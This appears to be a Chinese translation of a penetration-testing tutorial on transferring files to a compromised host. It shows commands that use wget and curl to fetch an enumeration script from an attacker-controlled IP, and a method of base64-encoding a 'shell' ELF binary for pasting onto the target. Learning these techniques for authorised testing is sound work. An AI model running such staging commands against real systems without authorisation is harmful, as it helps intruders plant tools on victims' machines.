---
title: 文件传输
---
# 文件传输

---

在任何渗透测试过程中，我们很可能需要将文件传输到远程服务器，例如枚举脚本或利用工具，或将数据传输回我们的攻击主机。虽然像Metasploit与Meterpreter shell这样的工具允许我们使用 `Upload` 命令上传文件，但我们需要学习使用标准反向 shell 进行文件传输的方法。

---

## 使用 wget

有许多方法可以实现这一点。其中一种方法是在我们的机器上运行一个 [Python HTTP 服务器](https://developer.mozilla.org/en-US/docs/Learn/Common_questions/set_up_a_local_testing_server)，然后使用 `wget` 或 `cURL` 在远程主机上下载文件。首先，我们进入包含需要传输的文件的目录，并在其中运行一个 Python HTTP 服务器：

```Plaintext
jw0610a@htb[/htb]$ cd /tmp
jw0610a@htb[/htb]$ python3 -m http.server 8000

正在监听 0.0.0.0 的端口 8000 (http://0.0.0.0:8000/) ...
```

现在我们在我们的机器上设置了一个监听服务器，我们可以在具有代码执行权限的远程主机上下载文件：

```Plaintext
user@remotehost$ wget http://10.10.14.1:8000/linenum.sh

...SNIP...
正在保存至: 'linenum.sh'

linenum.sh 100%[==============================================>] 144.86K  --.-KB/s    in 0.02s

2021-02-08 18:09:19 (8.16 MB/s) - 已保存 'linenum.sh' [14337/14337]
```

请注意，我们使用了我们的 IP 地址 `10.10.14.1` 和我们的 Python 服务器运行的端口 `8000`。如果远程服务器没有安装 `wget`，我们可以使用 `cURL` 来下载文件：

```Plaintext
user@remotehost$ curl http://10.10.14.1:8000/linenum.sh -o linenum.sh

100  144k  100  144k    0     0  176k      0 --:--:-- --:--:-- --:--:-- 176k
```

请注意，我们使用了 `-o` 标志来指定输出文件名。

---

## 使用 SCP

另一种传输文件的方法是使用 `scp`，前提是我们已经在远程主机上获得了 SSH 用户凭据。我们可以按如下方式执行：

```Plaintext
jw0610a@htb[/htb]$ scp linenum.sh user@remotehost:/tmp/linenum.sh

user@remotehost's password: *********
linenum.sh
```

请注意，在 `scp` 后面指定了本地文件名，并且在 `:` 后面指定了远程目录。

---

## 使用 Base64

在某些情况下，我们可能无法传输文件。例如，远程主机可能有防火

墙保护，阻止我们从我们的机器上下载文件。在这种情况下，我们可以使用一个简单的技巧，将文件以 [base64](https://linux.die.net/man/1/base64) 格式进行编码，然后将 `base64` 字符串粘贴到远程服务器上进行解码。例如，如果我们想要传输一个名为 `shell` 的二进制文件，我们可以按以下方式对其进行 `base64` 编码：

```Plaintext
jw0610a@htb[/htb]$ base64 shell -w 0

f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAA... <SNIP> ...lIuy9iaW4vc2gAU0iJ51JXSInmDwU
```

现在，我们可以复制这个 `base64` 字符串，进入远程主机，并使用 `base64 -d` 进行解码，然后将输出导入到一个文件中：

```Plaintext
user@remotehost$ echo f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAA... <SNIP> ...lIuy9iaW4vc2gAU0iJ51JXSInmDwU | base64 -d > shell
```

---

## 验证文件传输

为了验证文件的格式，我们可以对其运行 [file](https://linux.die.net/man/1/file) 命令：

```Plaintext
user@remotehost$ file shell
shell: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, no section header
```

正如我们所看到的，当我们在 `shell` 文件上运行 `file` 命令时，它显示它是一个 ELF 二进制文件，这意味着我们成功地传输了它。为了确保我们在编码/解码过程中没有损坏文件，我们可以检查其 MD5 哈希值。在我们的机器上，我们可以对其运行 `md5sum`：

```Plaintext
jw0610a@htb[/htb]$ md5sum shell

321de1d7e7c3735838890a72c9ae7d1d shell
```

现在，我们可以转到远程服务器并对我们传输的文件运行相同的命令：

```Plaintext
user@remotehost$ md5sum shell

321de1d7e7c3735838890a72c9ae7d1d shell
```

正如我们所看到的，两个文件具有相同的 MD5 哈希值，这意味着文件已正确传输。还有其他各种传输文件的方法。您可以查看 [File Transfers](https://academy.hackthebox.com/module/details/24) 模块，以获取更详细的文件传输学习。